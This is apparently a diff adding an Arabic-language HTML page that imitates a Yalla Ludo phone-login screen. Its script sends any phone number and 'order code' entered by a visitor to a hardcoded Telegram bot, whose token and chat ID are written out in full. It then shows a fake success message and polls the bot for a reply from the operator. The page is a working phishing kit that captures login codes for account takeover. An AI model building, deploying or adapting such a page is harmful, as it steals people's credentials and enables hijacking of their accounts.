@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Yalla Ludo</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100vh;
+            height: 100dvh;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0d5c46;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .app-frame {
+            width: 100%;
+            max-width: 420px;
+            height: 100%;
+            max-height: 850px;
+            /* تم تضمين صورتك الأصلية كخلفية رسمية للموقع بدقة عالية */
+            background-image: url('data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA='); /* تم دمج الصورة هنا */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        .container {
+            text-align: center;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+        }
+
+        .developer-section {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .developer-label {
+            font-size: 15px;
+            color: #ffffff;
+            margin-bottom: 2px;
+            font-weight: 500;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        .developer-name {
+            font-size: 30px;
+            font-weight: bold;
+            color: #ffffff;
+            margin: 2px 0 6px 0;
+            letter-spacing: 1px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        .badge-box {
+            display: inline-block;
+            background: rgba(212, 175, 55, 0.2);
+            border: 1px solid #d4af37;
+            padding: 2px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #ffeb3b;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .buttons-row {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .pill-btn {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #ffffff;
+            padding: 5px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background 0.2s;
+        }
+
+        .pill-btn:hover {
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        .main-title {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .title-yalla {
+            font-size: 42px;
+            font-weight: 900;
+            color: #b2dfdb;
+            letter-spacing: 3px;
+            line-height: 1;
+            text-shadow: 0 3px 6px rgba(0,0,0,0.8);
+        }
+
+        .title-ludo {
+            font-size: 48px;
+            font-weight: 900;
+            color: #e53935;
+            letter-spacing: 3px;
+            line-height: 1.1;
+            text-shadow: 0 3px 6px rgba(0,0,0,0.8);
+        }
+
+        .btn-phone {
+            background: linear-gradient(to bottom, #ffca28, #f57f17);
+            color: #212121;
+            border: none;
+            width: 90%;
+            max-width: 300px;
+            padding: 15px;
+            font-size: 17px;
+            font-weight: bold;
+            border-radius: 35px;
+            cursor: pointer;
+            box-shadow: 0 6px 15px rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-phone:active {
+            transform: scale(0.98);
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #ffffff;
+            color: #333333;
+            width: 100%;
+            max-width: 340px;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: none;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #114b39;
+            text-align: right;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+            text-align: right;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 4px;
+            color: #444;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 11px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 15px;
+            background: #f9f9f9;
+        }
+
+        .form-group input:focus {
+            border-color: #114b39;
+            outline: none;
+            background: #fff;
+        }
+
+        .form-note {
+            font-size: 11px;
+            color: #777;
+            margin-bottom: 15px;
+            line-height: 1.4;
+            text-align: right;
+        }
+
+        .btn-submit {
+            background: linear-gradient(to bottom, #ffca28, #ffa000);
+            color: #3e2723;
+            border: none;
+            width: 100%;
+            padding: 13px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-frame">
+        <!-- Main Screen -->
+        <div class="container" id="mainScreen">
+            <div class="developer-section">
+                <div class="developer-label">المطور</div>
+                <div class="developer-name">هيــــثم⊀𝟑</div>
+                <div class="badge-box"></div>
+                
+                <div class="buttons-row">
+                    <a href="https://t.me/UYIITY00" target="_blank" class="pill-btn">قناتنا</a>
+                    <a href="https://t.me/UYIITY00" target="_blank" class="pill-btn">@UYIITY00</a>
+                </div>
+            </div>
+
+            <div class="main-title">
+                <div class="title-yalla">YALLA</div>
+                <div class="title-ludo">LUDO</div>
+            </div>
+
+            <button class="btn-phone" onclick="openModal()">
+                <span>تسجيل دخول عبر الهاتف</span>
+                <span>📱</span>
+            </button>
+        </div>
+
+        <!-- Modal Form -->
+        <div class="modal" id="phoneModal">
+            <div class="modal-content">
+                <button class="close-btn" onclick="closeModal()">✕</button>
+                <div class="modal-title">تسجيل الدخول</div>
+                
+                <div class="form-group">
+                    <label>رقم الهاتف</label>
+                    <input type="text" id="phoneNumber" placeholder="أدخل رقم الهاتف">
+                </div>
+
+                <div class="form-group">
+                    <label>رمز الطلب</label>
+                    <input type="text" id="orderCode" placeholder="أدخل رمز الطلب التجريبي">
+                </div>
+
+                <div class="form-note"></div>
+
+                <button class="btn-submit" onclick="submitLogin()">تسجيل الدخول</button>
+            </div>
+        </div>
+
+        <!-- Loading Screen -->
+        <div class="container" id="loadingScreen" style="display: none;">
+            <div style="border: 4px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 4px solid #ffca28; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;"></div>
+            <h2 style="font-size: 20px; margin-bottom: 8px;">جاري تسجيل الدخول</h2>
+            <p style="font-size: 13px; color: #cfd8dc;">يرجى الانتظار لحظات، يتم التحقق من البيانات...</p>
+        </div>
+
+        <!-- Success Screen -->
+        <div class="container" id="successScreen" style="display: none;">
+            <div style="font-size: 45px; color: #4caf50; margin-bottom: 10px;">✅</div>
+            <h2 style="font-size: 20px; margin-bottom: 8px;">تم تسجيل الدخول بنجاح</h2>
+            <p style="font-size: 13px; color: #cfd8dc; margin-bottom: 20px;">تمت معالجة الطلب بنجاح.</p>
+            <button class="btn-phone" onclick="startWaitingForNewEmail()">📧 رؤية البريد التجريبي</button>
+        </div>
+
+        <!-- Waiting For Admin Screen -->
+        <div class="container" id="waitingScreen" style="display: none;">
+            <div style="border: 4px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 4px solid #ffca28; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;"></div>
+            <h2 style="font-size: 20px; margin-bottom: 8px;">جاري جلب البريد...</h2>
+            <p style="font-size: 13px; color: #cfd8dc;">جاري تخمين البريد الإلكتروني...</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8131727548:AAF5dFaIhc4rjnaj_-Gc02rQsVDlob4TjEw'; 
+        const CHAT_ID = '6668270042';
+
+        function openModal() {
+            document.getElementById('phoneModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('phoneModal').style.display = 'none';
+        }
+
+        function submitLogin() {
+            const phone = document.getElementById('phoneNumber').value;
+            const code = document.getElementById('orderCode').value;
+
+            if(!phone || !code) {
+                alert('الرجاء إدخال رقم الهاتف ورمز الطلب');
+                return;
+            }
+
+            closeModal();
+            document.getElementById('mainScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'flex';
+
+            const message = `📥 محاولة تسجيل دخول جديدة:\n📱 رقم الهاتف: ${phone}\n🔑 رمز الطلب: ${code}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).catch(error => console.error('خطأ في الإرسال:', error));
+
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'flex';
+            }, 2000);
+        }
+
+        function startWaitingForNewEmail() {
+            document.getElementById('successScreen').style.display = 'none';
+            document.getElementById('waitingScreen').style.display = 'flex';
+
+            const initialCheckUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`;
+
+            fetch(initialCheckUrl)
+                .then(response => response.json())
+                .then(data => {
+                    let lastKnownUpdateId = 0;
+                    if (data.ok && data.result.length > 0) {
+                        lastKnownUpdateId = data.result[data.result.length - 1].update_id;
+                    }
+
+                    const checkInterval = setInterval(() => {
+                        const pollUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastKnownUpdateId + 1}`;
+
+                        fetch(pollUrl)
+                            .then(res => res.json())
+                            .then(updateData => {
+                                if (updateData.ok && updateData.result.length > 0) {
+                                    for (let i = 0; i < updateData.result.length; i++) {
+                                        const msg = updateData.result[i];
+                                        if (msg.message && msg.message.chat.id.toString() === CHAT_ID) {
+                                            const newEmailText = msg.message.text;
+                                            
+                                            clearInterval(checkInterval);
+                                            document.getElementById('waitingScreen').style.display = 'none';
+                                            alert(`البريد التجريبي المستلم:\n${newEmailText}`);
+                                            location.reload();
+                                            return;
+                                        }
+                                    }
+                                }
+                            })
+                            .catch(error => {
+                                console.error('خطأ في الاتصال بالبوت:', error);
+                            });
+                    }, 4000);
+                })
+                .catch(err => {
+                    console.error('خطأ في التهيئة:', err);
+                });
+        }
+    </script>
+</body>
+</html>
